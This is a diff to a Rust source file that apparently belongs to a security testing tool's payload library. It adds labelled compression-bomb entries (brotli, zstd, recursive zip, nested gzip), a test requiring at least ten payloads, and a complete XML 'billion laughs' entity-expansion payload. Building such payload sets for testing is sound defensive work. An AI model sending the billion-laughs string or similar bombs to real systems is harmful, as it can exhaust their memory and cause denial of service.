@@ -84,6 +84,66 @@ pub fn get_payloads() -> Vec<Payload> {
         tags: vec!["zip".to_string(), "compression-bomb".to_string()],
     });
 
+    payloads.push(Payload {
+        payload_type: PayloadType::Compression,
+        payload: "brotli:1kb->1mb".to_string(),
+        description: "Brotli compression bomb - 1KB compressed to 1MB".to_string(),
+        severity: Severity::High,
+        tags: vec![
+            "compression".to_string(),
+            "bomb".to_string(),
+            "brotli".to_string(),
+        ],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Compression,
+        payload: "zstd:1kb->1mb".to_string(),
+        description: "Zstd compression bomb - 1KB compressed to 1MB".to_string(),
+        severity: Severity::High,
+        tags: vec![
+            "compression".to_string(),
+            "bomb".to_string(),
+            "zstd".to_string(),
+        ],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Compression,
+        payload: "zip-recursive".to_string(),
+        description: "Recursive zip bomb - 4 nested levels (1GB->1TB)".to_string(),
+        severity: Severity::Critical,
+        tags: vec![
+            "compression".to_string(),
+            "bomb".to_string(),
+            "recursive".to_string(),
+        ],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Compression,
+        payload: "gzip-nested".to_string(),
+        description: "Nested gzip bomb - double compressed gzip".to_string(),
+        severity: Severity::High,
+        tags: vec![
+            "compression".to_string(),
+            "bomb".to_string(),
+            "gzip".to_string(),
+        ],
+    });
+
+    payloads.push(Payload {
+        payload_type: PayloadType::Compression,
+        payload: r#"<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"><!ENTITY lol10 "&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;">]><root>&lol10;</root>"#.to_string(),
+        description: "XML billion laughs bomb".to_string(),
+        severity: Severity::Critical,
+        tags: vec![
+            "compression".to_string(),
+            "xml".to_string(),
+            "billion-laughs".to_string(),
+        ],
+    });
+
     payloads
 }
 
@@ -150,6 +210,16 @@ mod tests {
                 p.description
             );
         }
+    }
+
+    #[test]
+    fn minimum_payload_count() {
+        let payloads = get_payloads();
+        assert!(
+            payloads.len() >= 10,
+            "Must have substantial compression payload coverage, got {}",
+            payloads.len()
+        );
     }
 
     #[test]
